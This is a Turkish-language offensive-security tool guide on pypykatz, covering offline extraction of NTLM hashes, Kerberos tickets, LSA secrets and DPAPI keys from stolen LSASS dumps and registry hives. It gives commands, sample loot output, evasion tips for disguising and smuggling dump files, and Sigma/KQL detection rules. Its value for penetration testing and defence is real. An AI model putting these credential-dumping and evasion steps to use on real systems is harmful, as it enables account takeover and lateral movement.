# pypykatz

> **Kategori:** [7. Bellek Analizi, LSASS Dökümü ve Kasa Hasadı](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Benjamin Delpy'nin Mimikatz aracının saf Python ile sıfırdan yazılmış açık kaynaklı uygulaması olan; Windows `lsass.exe` minidump dosyalarını, ham RAM imajlarını, çevrimdışı kayıt defteri kovanlarını (SAM, SYSTEM, SECURITY) ve DPAPI sırlarını Linux, macOS ve Windows üzerinde tamamen çevrimdışı (offline) olarak ayrıştırıp parola, NTLM karması ve Kerberos biletlerini çıkaran çok platformlu bellek adli bilişim ve parola hasat aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory sızma testlerinde hedef Windows sunucularında canlı olarak Mimikatz veya benzeri PE ikililerini çalıştırmak, modern EDR (Endpoint Detection and Response) ve antivirüs çözümleri tarafından anında engellenmekte ve yüksek önem dereceli alarmlar tetiklemektedir. Saldırganlar bu tespitten kaçınmak için hedef makinede Mimikatz çalıştırmak yerine; yerel Windows bileşenleri (LOLBin'ler: `comsvcs.dll`, `ProcDump`) veya hafif bellek kopyalayıcılar (`nanodump`, `Dumpert`) ile yalnızca `lsass.exe` sürecinin minidump dosyasını (`lsass.dmp`) alıp kendi saldırı makinelerine aktarırlar (Exfiltration).

İşte bu noktada **`pypykatz`** (Tamas Jos / @skelsec tarafından geliştirilen), çalınan minidump dosyalarını analiz etmek için Linux veya macOS ortamında çalışan tam teşekküllü bir Mimikatz motoru sunar. Saf Python mimarisi sayesinde Windows API'lerine veya DLL dosyalarına bağımlı olmadan çalışan araç:
- **Minidump Ayrıştırma:** Windows XP'den en güncel Windows 11 ve Server 2022 sürümlerine kadar tüm Windows derlemelerinin (Build) LSASS bellek düzenini ve şifreleme yapılarını tanır.
- **Güvenlik Paketleri:** `msv1_0` (NTLM ve SHA1 hash'leri), `kerberos` (biletler, anahtarlar, açık parolalar), `wdigest`, `tspkg`, `credssp` ve `ssp` paketlerini ayrıştırır.
- **Kayıt Defteri Analizi:** Çevrimdışı alınan SAM, SYSTEM ve SECURITY kovanlarından yerel kullanıcı parolalarını, LSA sırlarını (LSA Secrets) ve önbelleğe alınmış etki alanı kimliklerini (DCC2 / mscache2) çözer.
- **DPAPI Desteği:** DPAPI ana anahtarlarını (Master Keys), Windows Kimlik Yöneticisi (Credential Manager) kasalarını ve Chrome/Chromium tarayıcı şifrelerini deşifre eder.

### Mimari Akış Şeması

```
[ Kurban Windows Host ]
       │
       │ (1) EDR-Safe Bellek Kopyası (comsvcs.dll / nanodump / ProcDump)
       ▼
[ lsass.dmp Minidump Dosyası ]
       │
       │ (2) Güvenli Veri Sızıntısı (Exfiltration / SMB / HTTP)
       ▼
[ Saldırgan Makinesi (Linux / macOS / Kali) ]
       │
       ▼
[ pypykatz Motoru (Saf Python / Çevrimdışı Analiz) ]
       ├── [ Minidump Parser ]  ──> Windows Build & Architecture Tespiti
       ├── [ LSA Decryptor ]    ──> IV ve AES/DES Anahtarlarını Bellekten Çıkar
       ├── [ Güvenlik Paketleri ]
       │     ├── msv1_0   ──> NTLM Karmaları (Pass-the-Hash için)
       │     ├── kerberos ──> .kirbi / .ccache Biletleri ve AES Anahtarları
       │     └── wdigest  ──> Açık Metin Parolalar (Varsa)
       └── [ DPAPI Modülü ]     ──> MasterKey'ler ve Tarayıcı Kasaları
       │
       ▼
[ Çıktı: Terminal / JSON Raporu / Hashcat Formatı ]
```

### Neden Önemli?

| Yetenek / Özellik | Açıklama | Operasyonel Değeri |
|---|---|---|
| **Sıfır Host Ayak İzi** | Kurban makinede hiçbir Mimikatz kodu çalıştırılmaz; analiz saldırganın kendi Linux makinesinde yapılır. | Windows EDR ve bellek tarayıcılarını tamamen baypas eder. |
| **Geniş Format Desteği** | Minidump (`.dmp`), Kayıt Defteri kovanları, ham RAM imajları ve DPAPI yapılarını tek çatı altında çözer. | Çoklu veri kaynaklarını tek komutla analiz etme esnekliği sunar. |
| **Kerberos Bilet Dökümü** | Minidump içindeki Kerberos biletlerini doğrudan `.kirbi` dosyası olarak diske kaydedebilir. | Çevrimdışı dökümden doğrudan Pass-the-Ticket yapmayı sağlar. |
| **JSON ve Otomasyon Desteği** | Çıktıları doğrudan yapılandırılmış JSON formatında verir (`-j`). | Kırmızı takım otomasyon betikleri ve C2 boru hatlarıyla kolayca entegre olur. |

### Karşılaştırma Tablosu

| Kriter | pypykatz | Mimikatz (sekurlsa::minidump) | lsassy | Volatility (mimikatz eklentisi) |
|---|---|---|---|---|
| **Platform** | Linux / macOS / Windows (Python) | Yalnızca Windows (Win32) | Linux (Python / Impacket) | Çapraz Platform (Python) |
| **Çalışma Ortamı** | Çevrimdışı (Minidump / Hives) | Windows Komut Satırı | Uzaktan Ağ Üzerinden (SMB) | Çevrimdışı Tam RAM İmajı |
| **Gereken Girdi** | `lsass.dmp` / Registry | `lsass.dmp` / Canlı LSA | Ağ Erişimi (Admin Kimliği) | Ham RAM Dump (Gigabaytlarca) |
| **Hız ve Hafiflik** | Çok Hızlı (Saniyeler) | Çok Hızlı | Hızlı | Yavaş (Büyük bellek taraması) |
| **Otomasyon** | Mükemmel (JSON Çıktı) | Zayıf (Metin Ayrıştırma) | Mükemmel (JSON/Kütüphane) | Orta |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

```bash
pypykatz <MODÜL> <ALT_KOMUT> [SEÇENEKLER] <HEDEF_DOSYA>
```

### Ana Modüller (Subcommands)

- **`minidump`**: LSASS minidump (`.dmp`) dosyalarını ayrıştırır. En sık kullanılan ana modüldür.
- **`registry`**: Çevrimdışı SAM, SYSTEM ve SECURITY kovanlarını çözümleyerek yerel kimlik bilgilerini döker.
- **`live`**: Windows üzerinde çalıştırıldığında canlı LSASS sürecini okur (Mimikatz gibi).
- **`dpapi`**: DPAPI anahtarlarını, kasa dosyalarını ve kayıtlı tarayıcı şifrelerini çözer.
- **`rekall`**: Tam fiziksel bellek dökümlerini (Rekall/Volatility formatı) ayrıştırır.
- **`smb`**: Uzak Windows hedeflerine SMB üzerinden bağlanıp döküm alır ve analiz eder.

### Kritik Parametre Tablosu

| Parametre | İlgili Modül | Açıklama | Örnek Kullanım |
|---|---|---|---|
| `-j, --json` | minidump, registry | Çıktıyı insan okunabilir metin yerine yapılandırılmış JSON olarak basar. | `pypykatz minidump -j lsass.dmp` |
| `-o, --outfile <dosya>` | Genel | Ayrıştırma sonuçlarını ekrana basmak yerine belirtilen dosyaya kaydeder. | `-o /tmp/results.json` |
| `-k, --kerberos-dir <dizin>`| minidump | Minidump içindeki Kerberos biletlerini `.kirbi` formatında belirtilen dizine yazar. | `-k /tmp/tickets/` |
| `--halt-on-error` | Genel | Ayrıştırma sırasında bilinmeyen bir veri yapısıyla karşılaşıldığında çökmek yerine durur. | Bayrak |
| `-e, --kerberos` | minidump | Yalnızca Kerberos oturum anahtarları ve biletlerini hedefler. | Bayrak |
| `-u, --user <filtre>` | minidump | Yalnızca belirtilen kullanıcı adının kimlik bilgilerini filtreler. | `-u Administrator` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: LOLBin ile Alınan Minidump Dosyasını Linux Üzerinde Çözümleme

Hedef Windows makinesinde `comsvcs.dll` veya `ProcDump` ile alınan `lsass.dmp` dosyası saldırganın Kali Linux makinesine indirilmiştir. pypykatz ile tüm NTLM hash'leri ve oturum parolaları dökülür.

```bash
pypykatz minidump /tmp/lsass.dmp
```

**pypykatz Konsol Çıktısı Analizi:**

```text
======== pypykatz ========
Parsing file: /tmp/lsass.dmp
Windows OS build detected: 19045 (Windows 10 / Server 2019)
Architecture: x64

== MSV1_0 (Local & Domain Credentials) ==
[LogonId: 0x3e7]
  Username: DA_Admin
  Domain: CORP
  LogonServer: DC01
  AuthType: Interactive
  NTLM: 01fc5a6be7bc6929c40372d23f5052b3
  SHA1: 4b5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b

== WDIGEST (Cleartext Provider) ==
  Username: DA_Admin
  Password: None (WDigest plaintext disabled)

== KERBEROS (Tickets & Keys) ==
  Username: DA_Admin
  Domain: CORP.LOCAL
  KeyList:
    [AES256] 1673a9f0e1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8
    [RC4]    01fc5a6be7bc6929c40372d23f5052b3
```

> [!IMPORTANT]
> `DA_Admin` kullanıcısına ait NTLM hash (`01fc5a...`) ve AES-256 anahtarı doğrudan elde edilmiştir. Bu anahtar `impacket-wmiexec` veya `impacket-getTGT` ile anında Pass-the-Hash / Overpass-the-Hash için kullanılabilir!

---

### Senaryo 2: Minidump İçindeki Kerberos Biletlerini (.kirbi) Dosyalarına Çıkarma

LSASS bellek dökümünde önbelleğe alınmış tüm TGT ve TGS biletleri ayıklanarak diske kaydedilir; böylece doğrudan `Rubeus ptt` veya `impacket-ticketConverter` ile kullanılabilir hale gelir.

```bash
mkdir -p /tmp/harvested_tickets
pypykatz minidump -k /tmp/harvested_tickets/ /tmp/lsass.dmp
```

**Dizin Çıktısı:**

```bash
ls -la /tmp/harvested_tickets/
# Çıktı:
# 0_Administrator_krbtgt_CORP.LOCAL.kirbi
# 1_svc_sql_MSSQLSvc_sql01.corp.local.kirbi
```

---

### Senaryo 3: Çevrimdışı Kayıt Defteri Kovanlarından (SAM & SYSTEM) Yerel Parolaları Çözme

Hedef sistemden `reg save HKLM\SAM sam.save` ve `reg save HKLM\SYSTEM system.save` komutlarıyla kopyalanan kovan dosyaları çözülerek yerel Administrator hash'i elde edilir.

```bash
pypykatz registry --sam sam.save system.save
```

**Konsol Çıktısı Analizi:**

```text
======== SAM HIVE PARSER ========
SAM Key: a1b2c3d4e5f6...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

---

### Senaryo 4: Çevrimdışı SECURITY Kovanından LSA Sırlarını Çıkarma

Etki alanı makinesinin kendi bilgisayar hesabı parolası (`$MACHINE.ACC`) ve kayıtlı servis hesaplarının parolaları SECURITY kovanından deşifre edilir.

```bash
pypykatz registry --security security.save system.save
```

**Konsol Çıktısı:**

```text
======== LSA SECRETS ========
$MACHINE.ACC:
  Current: aad3b435b51404eeaad3b435b51404ee:e1a96394aa6f5b407c3df50f2d398865 (WORKSTATION01$)
_SC_MSSQLSERVER:
  Cleartext Password: SqlServicePass2026!
```

---

### Senaryo 5: Yapılandırılmış JSON Çıktısı ile Otomasyon Boru Hattı Kurma

Büyük ölçekli sızma testlerinde elde edilen yüzlerce minidump dosyasının JSON olarak kaydedilip jq ile filtrelenmesi:

```bash
pypykatz minidump -j /tmp/lsass.dmp > /tmp/output.json

# Yalnızca NTLM hash'lerini ve kullanıcı adlarını filtreleme:
cat /tmp/output.json | jq -r '.logon_sessions[] | select(.msv1_0.NThash != null) | "\(.username):\(.msv1_0.NThash)"' | sort -u
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Kök Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Minidump parsing error: Architecture mismatch` | 32-bit (x86) ve 64-bit (x64) bellek düzeni uyumsuzluğu veya bozuk minidump başlığı. | Dökümün tam alındığını kontrol edin (`ls -lh`); dosya boyutu 40-150 MB aralığında olmalıdır. |
| `KeyError: 'Cannot find LSA decryption key'` | Windows işletim sisteminin çok yeni bir Insider derlemesi (Build) veya desteklenmeyen özel bir çekirdek yaması. | `pip install --upgrade pypykatz` komutu ile kütüphaneyi en son sürüme güncelleyin; yeni Windows build offset'leri güncellemeyle eklenir. |
| `Memory read error: Truncated dump file` | Minidump alınırken süreç tamamlanmadan kopyalanmış veya EDR döküm alma sürecini yarıda kesmiş. | Kurban makinede farklı bir yöntemle (`nanodump` veya `Dumpert`) tam ve kesintisiz yeni bir döküm oluşturun. |
| `Missing SYSTEM hive for SAM parsing` | SAM kovanı tek başına çözülemez; syskey anahtarı SYSTEM kovanında saklanır. | `system.save` kovanını da hedef makineden çekip komuta ikinci parametre olarak verin. |
| `UnicodeDecodeError on DPAPI blob` | DPAPI anahtarı çözülürken bozuk bayt dizilimi veya geçersiz anahtar boyutu. | Doğru kullanıcının SID'sine ait masterkey dosyasını kullandığınızdan emin olun. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
        GÜRÜLTÜ SEVİYESİ:
        - Analiz Aşaması : SIFIR (Tamamen Çevrimdışı / Saldırgan Hostu)
        - Döküm Aşaması  : DÖKÜM ARACINA BAĞLI (Hedef Hostta Sysmon 10)
──────────────────────────────────────────────────────────────────
[ Hedef Host Logu ] : pypykatz çalıştığında hedefte SIFIR log üretilir
[ Minidump İzleri ] : Minidump alınırken Event ID 11 (File Create), Sysmon 10
[ EDR / AV ]        : Hedef Windows makinesinde hiçbir EDR/AV kancası tetiklenmez
```

### 5.1 Bırakılan İzler (Artifacts & Event Logs)

- **Saldırgan Tarafı:** `pypykatz` kurban sistemde değil, saldırganın izole analiz istasyonunda (Linux) çalıştırıldığı için hedef ortamda hiçbir süreç (Process Creation), bellek okuma veya DLL kancası izi bırakmaz.
- **Döküm Alma Aşaması (Ön Koşul İzi):**
  - Kurban makinede minidump alınırken kullanılan LOLBin (`comsvcs.dll` veya `ProcDump`) hedef makinede iz bırakır:
    - **Sysmon Event ID 10:** Kaynak sürecin `lsass.exe` sürecine handle açması.
    - **Sysmon Event ID 11:** Diske `*.dmp` uzantılı büyük bir dosya yazılması.

### 5.2 Ağ ve EDR İmzaları

- `pypykatz` yerel bir komut satırı aracı olduğundan ağ trafiği üretmez.
- Ancak minidump dosyasının hedeften saldırgana sızdırılması (Exfiltration) sırasında SMB, HTTP veya DNS tünelleme kanallarında anomali boyutlu dosya transfer alarmları tetiklenebilir.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Araçtaki Karşılığı |
|---|---|---|
| **T1003.001** | OS Credential Dumping: LSASS Memory | Minidump dosyasını çevrimdışı ayrıştırıp parola ve hash çıkarma. |
| **T1003.002** | OS Credential Dumping: Security Account Manager | Çevrimdışı SAM kovanından yerel hesap karmalarını alma. |
| **T1555** | Credentials from Password Stores | DPAPI masterkey ve tarayıcı şifrelerini deşifre etme. |
| **T1550.002** | Use Alternate Authentication Material: Pass the Hash | Elde edilen NTLM karmalarını yanal harekete hazır hale getirme. |

### 5.4 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Önlem ve Operasyonel Tavsiye |
|---|---|
| **Döküm Dosyasının Diske Yazılması** | Hedef sistemde minidump dosyasını diske `.dmp` adıyla yazmayın. `nanodump` gibi araçlarla dökümü doğrudan şifreleyin veya `comsvcs.dll` çıktısını `.txt` / `.dat` gibi sahte uzantılarla gizleyin. |
| **Büyük Dosya Transferi İmzası** | Minidump dosyasını hedeften çekmeden önce `7z` veya `gzip` ile sıkıştırın ve parola korumalı şifreleyin (EDR DLP kurallarını atlatmak için). |
| **Analiz Hijyeni** | Saldırı makinenizdeki `/tmp/*.dmp` dosyalarını operasyon sonrasında güvenli olarak silin (`shred -u`). |

### 5.5 Savunma Karşılığı (Blue Team / KQL & Sigma)

**Sigma Kuralı — LSASS Minidump Dosyası Oluşturulması Tespiti (Hedef Host):**

```yaml
title: LSASS Process Memory Dump File Created
status: experimental
description: Detects the creation of dump files commonly associated with LSASS credential harvesting.
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 11
    TargetFilename|endswith:
      - '.dmp'
      - '.dump'
  filter:
    InitiatingProcessImage|endswith:
      - '\werfault.exe'
  condition: selection and not filter
level: high
```

**Microsoft Sentinel (KQL) — Şüpheli LSASS Bellek Dökümü İşlemleri:**

```kql
DeviceFileEvents
| where FileName endswith ".dmp" or FileName endswith ".dump"
| where FolderPath has_any ("Temp", "Public", "PerfLogs", "Windows\\Temp")
| where FileSize > 30000000 // 30 MB üzeri tipik LSASS döküm boyutu
| project TimeGenerated, DeviceName, ActionType, FileName, FolderPath, InitiatingProcessCommandLine
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

### Komut 1: Standart Minidump Ayrıştırma
```bash
pypykatz minidump /tmp/lsass.dmp
```
- **Ne Yapar?** Belirtilen LSASS döküm dosyasını ayrıştırarak tüm oturumlara ait NTLM hash'lerini, Kerberos anahtarlarını ve açık metin parolaları ekrana döker.
- **Ne Zaman Kullanılır?** Kurban Windows makinesinden çalınan minidump dosyasını analiz etmek için.
- **Parametreler:** İlk parametre dosya yoludur.

### Komut 2: Kerberos Biletlerini (.kirbi) Otomatik Ayıklama
```bash
pypykatz minidump -k /tmp/tickets/ /tmp/lsass.dmp
```
- **Ne Yapar?** Bellekte önbelleğe alınmış tüm TGT ve TGS biletlerini çıkarır ve belirtilen dizine `.kirbi` dosyaları halinde kaydeder.
- **Ne Zaman Kullanılır?** Parola kırmaya gerek kalmadan doğrudan Pass-the-Ticket saldırısı yapmak için.
- **Parametreler:** `-k`: Biletlerin kaydedileceği hedef dizin.

### Komut 3: JSON Formatında Çıktı Alma ve Dosyaya Kaydetme
```bash
pypykatz minidump -j -o /tmp/loot.json /tmp/lsass.dmp
```
- **Ne Yapar?** Tüm kimlik verilerini yapılandırılmış JSON formatında belirtilen dosyaya yazar.
- **Ne Zaman Kullanılır?** Verileri otomatik ayrıştırma betiklerine veya C2 veritabanına aktarırken.
- **Parametreler:** `-j`: JSON modu, `-o`: Çıktı dosya yolu.

### Komut 4: Yalnızca Belirli Bir Kullanıcının Bilgilerini Çekme
```bash
pypykatz minidump -u Administrator /tmp/lsass.dmp
```
- **Ne Yapar?** Tüm bellek dökümü yerine yalnızca `Administrator` kullanıcısına ait oturum verilerini filtreler.
- **Ne Zaman Kullanılır?** Binlerce oturum barındıran terminal sunucularında kritik yönetici hesabını hızla bulmak için.
- **Parametreler:** `-u`: Filtrelenecek kullanıcı adı.

### Komut 5: Çevrimdışı SAM ve SYSTEM Kovanlarından Yerel Hash Dökümü
```bash
pypykatz registry --sam sam.save system.save
```
- **Ne Yapar?** Yerel kullanıcıların (Administrator, Guest vb.) LM ve NTLM parola karmalarını hesaplar ve döker.
- **Ne Zaman Kullanılır?** Kayıt defteri yedeği alındığında yerel yönetici hash'ini almak için.
- **Parametreler:** `--sam`: SAM kovanı, `system.save`: SYSTEM kovanı.

### Komut 6: Çevrimdışı SECURITY Kovanından LSA Sırlarını Dökme
```bash
pypykatz registry --security security.save system.save
```
- **Ne Yapar?** Makine hesabı NTLM hash'i (`$MACHINE.ACC`) ve Windows servis şifrelerini deşifre eder.
- **Ne Zaman Kullanılır?** Makine hesabı üzerinden etki alanı hakları elde etmek veya servis parolalarını ele geçirmek için.
- **Parametreler:** `--security`: SECURITY kovanı.

### Komut 7: DPAPI MasterKey Dosyalarını Çözümleme
```bash
pypykatz dpapi masterkey /tmp/masterkeys/ system.save
```
- **Ne Yapar?** SYSTEM kovanındaki LSA sırlarını kullanarak kurban kullanıcının DPAPI master key dosyalarını deşifre eder.
- **Ne Zaman Kullanılır?** Chrome, Edge veya RDCMan gibi DPAPI ile şifrelenmiş uygulama kasalarını açmak için.
- **Parametreler:** İlk parametre masterkey dizini, ikinci parametre SYSTEM kovanı.

### Komut 8: Yalnızca Kerberos Verilerini Hedefleme
```bash
pypykatz minidump -e /tmp/lsass.dmp
```
- **Ne Yapar?** NTLM ve diğer paketleri atlayarak yalnızca Kerberos biletlerini ve AES/RC4 anahtarlarını listeler.
- **Ne Zaman Kullanılır?** Kerberos odaklı saldırılarda çıktıyı sadeleştirmek için.
- **Parametreler:** `-e`: Kerberos odaklı filtreleme.

---

## Kaynaklar

- **Resmi GitHub Reposu:** [Skelsec / pypykatz](https://github.com/skelsec/pypykatz)
- **PyPI Paketi:** [pypykatz on PyPI](https://pypi.org/project/pypykatz/)
- **MITRE ATT&CK Referansı:** [T1003.001 - LSASS Memory](https://attack.mitre.org/techniques/T1003/001/)
- **Benjamin Delpy (Gentilkiwi) — Mimikatz:** [Gentilkiwi Mimikatz](https://github.com/gentilkiwi/mimikatz)

---

> **Önceki:** [← Mimikatz](./Mimikatz.md) · **Sonraki:** [nanodump →](./nanodump.md)
